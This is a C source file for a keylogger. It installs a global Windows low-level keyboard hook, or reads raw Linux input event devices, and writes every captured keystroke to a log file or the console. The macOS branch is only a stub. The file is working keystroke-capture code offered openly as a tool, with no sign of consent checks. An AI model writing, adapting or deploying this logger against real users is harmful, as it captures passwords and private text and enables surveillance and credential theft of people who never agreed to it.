#include <stdio.h>
#include <stdlib.h>

#include "../include/translation.h"


#if defined(_WIN32) || defined(_WIN64)
#define OS_TYPE "Windows"
#include <windows.h>
// Global variables needed for the static callback procedure
HHOOK g_hook = NULL;
keymap_translator_t *g_kt = NULL;
FILE *g_logfile = NULL;

// The Hook Callback Procedure (Windows calls this every time a key event occurs)
LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        char utf8[8];
        int len = keymap_translate_event(g_kt, wParam, lParam, utf8, sizeof(utf8));
        
        if (len > 0) {
            if (g_logfile) {
                // Equivalent to your log_keys output functionality
                fwrite(utf8, 1, len, g_logfile);
                fflush(g_logfile); 
            } else {
                // Equivalent to your read_cycle_no_file_log functionality
                printf("Key: %s\n", utf8);
            }
        }
    }
    // Forward the event to the next application in the hook chain
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

int main(int argc, char **argv) {
    // If an argument is provided, attempt to use it as a log file
    if (argc == 2) {
        g_logfile = fopen(argv[1], "a+");
        if (!g_logfile) {
            perror("Failed to open log file");
            return EXIT_FAILURE;
        }
        printf("Logging keys directly to file: %s\n", argv[1]);
        fprintf(g_logfile,"=== KeyStrokes Log ===\n");
    } else {
        printf("Printing keys directly to console...\n");
    }

    // Initialize layout translator
    if (keymap_translator_init(&g_kt) != 0) {
        fprintf(stderr, "Failed to init keymap translator\n");
        if (g_logfile) fclose(g_logfile);
        return EXIT_FAILURE;
    }

    // Install the low-level keyboard hook globally
    g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, GetModuleHandle(NULL), 0);
    if (!g_hook) {
        fprintf(stderr, "Failed to install hook. Error code: %lu\n", GetLastError());
        keymap_translator_destroy(g_kt);
        if (g_logfile) fclose(g_logfile);
        return EXIT_FAILURE;
    }

    printf("Key Logger active. Press Ctrl+C in this terminal to exit.\n");

    // CRITICAL: Windows requires an active Message Loop on the hook thread.
    // Without this loop, the OS hook will timeout, fail, or freeze input.
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Cleanup resources upon exit
    UnhookWindowsHookEx(g_hook);
    keymap_translator_destroy(g_kt);
    if (g_logfile) fclose(g_logfile);

    return 0;
}

#elif defined(__linux__)
#define OS_TYPE "Linux"
    #include <fcntl.h>
    #include <unistd.h>
    #include <errno.h>
    
    #include <linux/input.h>
    
    
    
    
    void log_keys(int fd, int fd_logfile){
        
        struct input_event event;
        
        keymap_translator_t * kt;
        if (keymap_translator_init(&kt) != 0) {
            fprintf(stderr, "Failed to init keymap translator\n");
            return;
        }
        
        struct input_event ev;
        char utf8[8];
        
        int bytes_read = read(fd, &ev, sizeof(ev));
    
        while (bytes_read == sizeof(ev)) {
            int len = keymap_translate_event(kt, &ev, utf8, sizeof(utf8));
            if (len > 0) {
                write(fd_logfile,utf8,len);

            }
    
            bytes_read = read(fd,&ev,sizeof(ev));
        }
        
        keymap_translator_destroy(kt);
    
    }
    
    void read_cycle_no_file_log(int fd){
    
        struct input_event event;
        
        keymap_translator_t * kt;
        if (keymap_translator_init(&kt) != 0) {
            fprintf(stderr, "Failed to init keymap translator\n");
            return;
        }
        
        struct input_event ev;
        char utf8[8];
        
        while (read(fd, &ev, sizeof(ev)) == sizeof(ev)) {
            int len = keymap_translate_event(kt, &ev, utf8, sizeof(utf8));
            if (len > 0) {
                printf("Key: %s\n", utf8);
            }
        }
        
        keymap_translator_destroy(kt);
    
    }
    
    void close_fd(int fd){
        if (fd){
            close(fd);
            fd = -1;
        }
    }
    
    
    int main(int argc,char ** argv){
    
        if (argc < 2){
            printf("Usage: %s <event-file>\n",argv[0]);
            return 1;
        }
    
    
        int fd = open(argv[1],O_RDONLY,0);
    
        if (fd == -1){
            perror("open");
            return EXIT_FAILURE;
        }
    
        printf("Opened file descriptor %d\n",fd);
    
        if (argc == 2)
            read_cycle_no_file_log(fd);   
        
        if ( argc == 3 ){
            int fd_logfile = open(argv[2],O_CREAT|O_APPEND|O_WRONLY,0640);
    
            if (fd_logfile == -1){
                close_fd(fd);
                
                perror("[OPEN] - logfile failed to open");
                return EXIT_FAILURE;
            }
    
            log_keys(fd,fd_logfile);
    
            close_fd(fd_logfile);
        }
        
        close_fd(fd);
    
        return 0;
    }
    
#elif defined(__APPLE__) && defined(__MACH__)
    #include <TargetConditionals.h>
    #if TARGET_OS_IPHONE
        #define OS_TYPE "iOS"
    #else
        #define OS_TYPE "macOS"
    #endif
#else
    #error "Unsupported operating system"
#endif